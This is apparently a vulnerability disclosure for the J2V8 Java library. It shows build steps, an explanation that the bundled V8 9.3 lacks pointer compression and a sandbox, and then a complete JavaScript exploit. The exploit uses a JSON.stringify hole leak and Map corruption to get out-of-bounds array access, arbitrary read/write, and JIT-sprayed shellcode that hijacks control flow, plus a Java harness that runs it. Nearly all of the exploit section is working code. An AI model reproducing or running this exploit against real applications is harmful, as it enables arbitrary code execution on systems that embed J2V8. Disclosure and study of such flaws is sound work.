# basic info

product：[https://github.com/eclipsesource/J2V8](https://github.com/eclipsesource/J2V8)


# Environment Setup

Set up the JDK

```Bash
sudo apt-get update
sudo apt-get install -y openjdk-11-jdk maven build-essential cmake maven

export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64
echo $JAVA_HOME
ls -l $JAVA_HOME/include/jni.h
```

prepare to complie

```Bash
source j2v8-cli.sh

curl -fL --retry 3 --retry-delay 2 -o libv8_9.3.345.11_monolith.zip \
  https://download.eclipsesource.com/j2v8/v8/libv8_9.3.345.11_monolith.zip

mkdir -p v8.out && unzip -o libv8_9.3.345.11_monolith.zip -d v8.out

python2 build.py -t linux -a x64 j2v8cmake j2v8jni j2v8cpp j2v8java
```

After compilation is complete, a JAR package can be obtained.

```Bash
➜  J2V8 git:(master) ✗ ls -lah build.out/
total 8.1M
drwxrwxr-x  2 x docker 4.0K Aug 15 10:47 .
drwxrwxr-x 21 x x  4.0K Aug 15 10:47 ..
-rw-rw-r--  1 x docker 8.1M Aug 15 10:47 j2v8_linux_x86_64-6.2.1.jar
➜  J2V8 git:(master) ✗ 

```



# RCA

The V8 version is 9.3.345.11, as indicated in [https://github.com/eclipsesource/J2V8/blob/master/v8/Dockerfile](https://github.com/eclipsesource/J2V8/blob/master/v8/Dockerfile).

Since this version contains numerous n-day vulnerabilities, I opted for a hole leak attack.

Based on the provided compilation options, I can adapt an exploit that does not enable pointer compression, and since there is no V8 sandbox, it is possible to achieve RIP hijacking via JIT spray.

```Python
target_os = "linux"
target_cpu = "x64"
is_component_build = false
is_debug = false
use_custom_libcxx = false
v8_monolithic = true
v8_use_external_startup_data = false
symbol_level = 0
v8_enable_i18n_support= false
v8_enable_pointer_compression = false
```



# exploit

my machine

```Markdown
➜  ~ lsb_release -a            
No LSB modules are available.
Distributor ID:  Ubuntu
Description:  Ubuntu 22.04.5 LTS
Release:  22.04
Codename:  jammy
```



js code

```JavaScript
var buf = new ArrayBuffer(8);
var f32 = new Float32Array(buf);
var f64 = new Float64Array(buf);
var u8 = new Uint8Array(buf);
var u16 = new Uint16Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);

function lh_u32_to_f64(l,h){
    u32[0] = l;
    u32[1] = h;
    return f64[0];
}
function f64_to_u32l(val){
    f64[0] = val;
    return u32[0];
}
function f64_to_u32h(val){
    f64[0] = val;
    return u32[1];
}
function f64_to_u64(val){
    f64[0] = val;
    return u64[0];
}
function u64_to_f64(val){
    u64[0] = val;
    return f64[0];
}

function u64_to_u32_lo(val){
    u64[0] = val;
    return u32[0];
}

function u64_to_u32_hi(val) {
    u64[0] = val;
    return u32[1];
}

function trigger() {
    let a = [], b = [];
    let s = '"'.repeat(0x800000);
    a[20000] = s;
    for (let i = 0; i < 10; i++) a[i] = s;
    for (let i = 0; i < 10; i++) b[i] = a;

    try {
        JSON.stringify(b);
    } catch (hole) {
        return hole;
    }
    throw new Error('could not trigger');
}

let leak_hole = trigger();

let map = new Map();
map.set(1, 1);
map.set(leak_hole, 1);
map.delete(leak_hole);
map.delete(leak_hole);
map.delete(1);


map.set(20, -1);
var oob_arr = [1.1];
var tmp_arr = [2.2];
var rw_arr  = [3.3];
var obj_arr = [0xeada, rw_arr];
map.set(0x41414145, 0);
var cor_length = oob_arr.length;


function addressOf(obj){
    obj_arr[1] = obj;
    return f64_to_u64(oob_arr[0x16]);
}

function AAR(addr){
    oob_arr[0x11] = u64_to_f64(addr-0x10n);
    return f64_to_u64(rw_arr[0]);
}

function AAW(addr,val){
    oob_arr[0x11] = u64_to_f64(addr-0x10n);
    rw_arr[0] = u64_to_f64(val);
}

const shellcode = () => {return [
    1.9553825422107533e-246,
    1.9560612558242147e-246,
    1.9995714719542577e-246,
    1.9533767332674093e-246,
    2.6348604765229606e-284
];}


for(let i = 0; i< 80000; i++){
    shellcode();shellcode();
}

var shellcode_addr = addressOf(shellcode);
var code_addr = AAR(shellcode_addr+0x30n);
var rop_addr = code_addr + 0xcdn - 0x5fn;

AAW(shellcode_addr+0x30n, rop_addr);
shellcode();

```



java test code

```Java
import com.eclipsesource.v8.*;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Main {
    public static void main(String[] args) throws Exception {
        V8 v8 = V8.createV8Runtime();
        String js_part1 = new String(Files.readAllBytes(Paths.get("poc.js")));
        V8Object result = (V8Object)v8.executeScript(js_part1);
    }
}
```

